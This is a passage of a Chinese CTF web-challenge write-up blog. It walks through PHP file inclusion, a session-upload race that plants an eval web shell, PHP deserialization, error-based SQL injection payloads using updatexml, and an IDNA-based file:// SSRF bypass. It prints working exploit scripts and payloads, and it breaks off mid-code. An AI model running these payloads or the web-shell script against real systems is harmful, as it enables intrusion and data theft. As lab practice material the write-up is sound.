punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>&lt;><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>include($_GET["file"])<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用伪协议读取<br>flflflflag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>&lt;><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$secret</span><span class="token operator">=</span><span class="token string single-quoted-string">'%^$&amp;$#fffdflag_is_not_here_ha_ha'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>dir.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span>@<span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token variable">$pass</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script language="javascript" type="text/javascript">           window.location.href="flflflflag.php";&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hash"</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"username/password error"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--md5($secret.$name)===$pass --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个<code>dir.php</code>，很难不让人联想到利用<code>session</code>条件竞争写木马</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> io<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread<span class="token keyword">from</span> time <span class="token keyword">import</span> sleepur<span class="token operator">=</span><span class="token string">'http://9fe5d7d0-6a86-40a8-b6e3-6a6ed9d00084.node4.buuoj.cn:81/flflflflag.php'</span>dat<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php fputs(fopen('a.php','w'),'&lt;?php eval($_GET[door])?>');?>"</span><span class="token punctuation">&#125;</span>fil<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>cooki<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'abc'</span><span class="token punctuation">&#125;</span>par<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'/tmp/sess_abc'</span><span class="token punctuation">&#125;</span>ses<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>ur<span class="token punctuation">,</span>data<span class="token operator">=</span>dat<span class="token punctuation">,</span>files<span class="token operator">=</span>fil<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cooki<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">:</span>            sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>a<span class="token operator">=</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Upload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    ses<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>ur<span class="token punctuation">,</span>params<span class="token operator">=</span>par<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>蚁剑连接即可</del><br>flag在<code>phpinfo</code>里</p><h1 id="lt-NPUCTF2020-gt-ReadlezPHP"><a href="#lt-NPUCTF2020-gt-ReadlezPHP" class="headerlink" title="&lt;NPUCTF2020&gt;ReadlezPHP"></a>&lt;NPUCTF2020&gt;ReadlezPHP</h1><p>打开题目，无提示，扫描目录，无果，在源代码里搜索<code>php</code>，发现隐藏链接</p><p>打开得到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#error_reporting(0);</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的反序列化题<br>尝试<code>system</code>和<code>exec</code>无果，应该是被禁用了，<code>assert</code>可行，在<code>phpinfo</code>界面看到大部分执行系统命令的函数被禁用了</p><p><del>flag就在phinfo里是我没想到的</del></p><h1 id="lt-RCTF2015-gt-EasySQL"><a href="#lt-RCTF2015-gt-EasySQL" class="headerlink" title="&lt;RCTF2015&gt;EasySQL"></a>&lt;RCTF2015&gt;EasySQL</h1><p>打开题目，测试功能。<br>注册，登录，修改密码，那么极有可能存在二次注入。<br>经过测试，发现如果注册的用户名含有双引号，在修改密码后页面回显报错信息。例如</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“a”” and pwd=’72ea3f1e65a1d2b8046e7fb756498dbd’’ at line 1</p></blockquote><p>不难猜测语句为</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">"..."</span> <span class="token operator">and</span> pwd<span class="token operator">=</span><span class="token string">'...'</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于无其他查询回显页面，尝试报错注入</p><p>库名</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">aaaaa"||updatexml(1,(concat(0x7e,(database()),0x7e)),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘~web_sqli~’</p></blockquote><p>表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">aaaaa"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘~article,flag,users~’</p></blockquote><p>列名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">bbbb"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘<del>flag</del>‘</p></blockquote><p>数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ddddd"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘~RCTF{Good job! But flag not her’</p></blockquote><p>虚晃一枪，能看出来是截断的，显示16个字符<br>最终发现flag是在表<code>users</code>里，截断函数都被过滤了，没有过滤<code>reverse()</code></p><p>前半段</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ddddd"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’</p></blockquote><p>可以发现有其他字符干扰，没法完全读取，正则函数未被过滤，尝试使用正则</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ddddd"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token operator">regexp</span><span class="token punctuation">(</span><span class="token string">'^flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配合<code>reverse()</code>得到flag</p><h1 id="lt-SUCTF-2019-gt-Pythonginx"><a href="#lt-SUCTF-2019-gt-Pythonginx" class="headerlink" title="&lt;SUCTF 2019&gt;Pythonginx"></a>&lt;SUCTF 2019&gt;Pythonginx</h1><p>打开题目，得到部分源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment">#去掉 url 中的空格</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然是要设法访问<code>suctf.cc</code>,<br>注意到意义不明的<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>，<br>先用<code>idna</code>编码又用<code>utf-8</code>解码，嗯，耐人寻味，查了下<code>idna</code>编码，<br>发现就有现成的字符<code>℆</code>，<del>大概是师傅们都是从这题了解的</del>,<br>但是这样的话，只能得到<code>suctf.cc/u*</code>下的文件，遇事不决，先把能看的都看看，<br>在看配置文件时候<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code></p><p>回显</p><blockquote><p>server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } }</p></blockquote><p>很显然了，<code>file://suctf.c℆sr/fffffflag</code>，得到<code>flag</code></p><h1 id="lt-SWPUCTF-2018-gt-SimplePHP"><a href="#lt-SWPUCTF-2018-gt-SimplePHP" class="headerlink" title="&lt;SWPUCTF 2018&gt;SimplePHP"></a>&lt;SWPUCTF 2018&gt;SimplePHP</h1><p>打开题目，文件上传，但查看文件功能有漏洞，控制url可以查看服务端代码</p><p>查看代码可以发现并不存在文件上传漏洞，反而是<code>file.php?file=</code>这个参数大有可为</p><p><code>file.php</code>中部分代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>class.php</code>代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token 